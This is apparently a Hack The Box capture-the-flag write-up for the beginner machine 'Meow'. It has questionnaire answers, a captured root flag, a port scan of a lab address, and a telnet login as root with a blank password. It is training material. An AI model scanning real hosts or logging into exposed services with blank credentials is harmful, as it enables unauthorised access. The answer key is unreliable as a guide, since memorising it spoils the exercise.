# Meow

## Questionnaire

##### What does the acronym VM stand for?

```
Virtual Machine
```

##### What tool do we use to interact with the operating system in order to issue commands via the command line, such as the one to start our VPN connection? It's also known as a console or shell.

```
terminal
```

##### What service do we use to form our VPN connection into HTB labs?

```
openvpn
```

##### What is the abbreviated name for a 'tunnel interface' in the output of your VPN boot-up sequence output?

```
tun
```

##### What tool do we use to test our connection to the target with an ICMP echo request?

```
ping
```

##### What is the name of the most common tool for finding open ports on a target?

```
nmap
```

##### What service do we identify on port 23/tcp during our scans?

```
telnet
```

##### What username is able to log into the target over telnet with a blank password?

```
root
```

##### Submit root flag

```
b40abdfe23665f766f9c61ecba8a4c19
```

## Commands

### Scan

```
$ rustscan -a 10.129.43.238

PORT   STATE SERVICE REASON
23/tcp open  telnet  syn-ack
```

### Telnet

```
$ telnet -l root 10.129.43.238

Trying 10.129.43.238...
Connected to 10.129.43.238.
Escape character is '^]'.
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64)
```
